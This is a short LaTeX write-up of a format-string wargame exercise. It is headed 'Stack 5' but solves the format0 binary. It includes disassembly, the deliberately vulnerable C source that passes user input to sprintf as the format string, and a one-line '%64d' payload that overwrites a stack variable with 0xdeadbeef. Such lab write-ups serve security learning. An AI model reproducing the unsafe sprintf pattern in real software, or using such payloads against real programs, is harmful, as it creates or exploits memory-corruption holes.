
\begin{center}\begin{LARGE} Stack 5\end{LARGE}\end{center}
 
\subsection*{Problem}

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
Dump of assembler code for function main:
0x0804842b <main+0>:    push   ebp
0x0804842c <main+1>:    mov    ebp,esp
0x0804842e <main+3>:    and    esp,0xfffffff0
0x08048431 <main+6>:    sub    esp,0x10
0x08048434 <main+9>:    mov    eax,DWORD PTR [ebp+0xc]
0x08048437 <main+12>:   add    eax,0x4
0x0804843a <main+15>:   mov    eax,DWORD PTR [eax]
0x0804843c <main+17>:   mov    DWORD PTR [esp],eax
0x0804843f <main+20>:   call   0x80483f4 <vuln>
0x08048444 <main+25>:   leave
0x08048445 <main+26>:   ret

Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:    push   ebp
0x080483f5 <vuln+1>:    mov    ebp,esp
0x080483f7 <vuln+3>:    sub    esp,0x68
0x080483fa <vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0
0x08048401 <vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <vuln+16>:   mov    DWORD PTR [esp+0x4],eax
0x08048408 <vuln+20>:   lea    eax,[ebp-0x4c]
0x0804840b <vuln+23>:   mov    DWORD PTR [esp],eax
0x0804840e <vuln+26>:   call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048416 <vuln+34>:   cmp    eax,0xdeadbeef
0x0804841b <vuln+39>:   jne    0x8048429 <vuln+53>
0x0804841d <vuln+41>:   mov    DWORD PTR [esp],0x8048510
0x08048424 <vuln+48>:   call   0x8048330 <puts@plt>
0x08048429 <vuln+53>:   leave
0x0804842a <vuln+54>:   ret
\end{minted}

We can see from `<vuln+6>` that the target variable is at `ebp-0xc`. We could solve
the problem through a buffer overflow by using 64char followed by `0xdeadbeef`
but our hint is to solve the question in 10bytes of input.

\subsection*{Idea and Attack process}

We do a bit of searching for format string attacks and we learn that using `%`
followed by a numerical digit allows us to inject characters without generating
them. We can see that the buffer is 64 characters and we inject 64 digits followed
by the target.

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
./format0 $(python -c "print '%64d\xef\xbe\xad\xde'")
>>> you have hit the target correctly :)e
\end{minted}

\subsection*{Source code}

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {c}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
\end{minted}
